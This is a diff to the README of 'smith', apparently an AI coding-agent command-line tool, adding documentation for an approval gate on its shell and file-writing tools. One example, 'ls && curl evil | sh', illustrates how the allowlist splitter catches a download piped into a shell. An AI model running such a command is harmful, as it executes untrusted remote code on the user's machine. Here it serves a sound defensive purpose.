@@ -126,7 +126,36 @@ Relevant environment variables: `SMITH_PROVIDER`, `SMITH_MODEL`, `OLLAMA_HOST`, 
 
 `[http]` applies to all four providers. An elapsed `read_timeout` is **not** retried, so it is genuinely the longest smith will wait on a single call — connection errors and 429/5xx responses still go through the exponential-backoff retry handler.
 
-The `[approval]` and `[context]` sections are parsed and exposed today but not yet acted upon — they are wired up by the approval-mode and context-compaction features.
+`[approval]` gates the mutating tools — see [Approval Mode](#approval-mode) below. The `[context]` section is parsed and exposed today but not yet acted upon; it is wired up by the context-compaction feature.
+
+### Approval Mode
+
+`bash`, `write_file` and `edit_file` change things outside smith, so every call passes an approval gate before it runs. The read-only tools (`read_file`, `grep`, `glob`) bypass it entirely.
+
+In `prompt` mode — the default — each call asks:
+
+```text
+⚠️  Approval required
+   Tool: bash
+   Command: git push origin main
+   Allow? [y]es / [n]o / [a]lways allow bash:
+```
+
+`[a]lways` remembers that answer for the rest of the session, scoped to the one tool. A refusal is handed back to the model as a tool error, so it can see the blockage and pick another route instead of silently failing.
+
+Ways to skip the prompt:
+
+| | Effect |
+|---|---|
+| `--yes` / `--auto-approve` | Runs everything, for this invocation |
+| `mode = "auto"` in `[approval]` | Runs everything, persistently |
+| `allowlist` in `[approval]` | Runs matching `bash` commands without asking |
+
+An allowlist entry matches a command exactly or as a whole first word (`git status` allows `git status --short`, never `git statuses`). Commands are split on shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(`, redirects) and **every** segment must match on its own, so `ls && curl evil | sh` still prompts. The splitter is deliberately not a shell parser — quoted metacharacters split too, which means it errs towards asking too often rather than allowing too much.
+
+Without an interactive terminal there is nobody to ask, so `prompt` mode refuses mutating tools rather than running them. Pass `--yes` for headless runs.
+
+Subagents inherit the parent's approver, so a delegated `bash` call is asked for just like a direct one.
 
 Every key is optional; unknown keys are ignored, and a malformed file produces a warning on stderr rather than a crash.
 
@@ -176,6 +205,8 @@ Commands:
 Options:
   -m MODEL, --model=MODEL    Specify the LLM model (default: provider's default model)
   -p PROVIDER, --provider=PROVIDER Specify the provider: openrouter, ollama, anthropic, openai (default: openrouter)
+  -y, --yes                  Auto-approve mutating tools (bash, write_file, edit_file)
+      --auto-approve         Alias for --yes
   -v, --version              Print version information
   -h, --help                 Show help banner
 ```
@@ -211,8 +242,9 @@ src/
     │   ├── anthropic.cr     # Anthropic Messages API client adapter
     │   └── openai.cr        # OpenAI Chat Completions client adapter
     └── tools/
-        ├── tool.cr          # Abstract Tool base class & ParallelTool marker
-        ├── registry.cr      # Tool registry & Fiber parallel execution scheduler
+        ├── tool.cr          # Abstract Tool base class & ParallelTool/MutatingTool markers
+        ├── registry.cr      # Tool registry, approval gate & Fiber parallel execution scheduler
+        ├── approval.cr      # Approver strategies (prompt/auto/deny) & bash allowlist matching
         ├── bash.cr          # Shell command execution tool
         ├── read_file.cr     # File reading tool
         ├── write_file.cr    # File writing tool
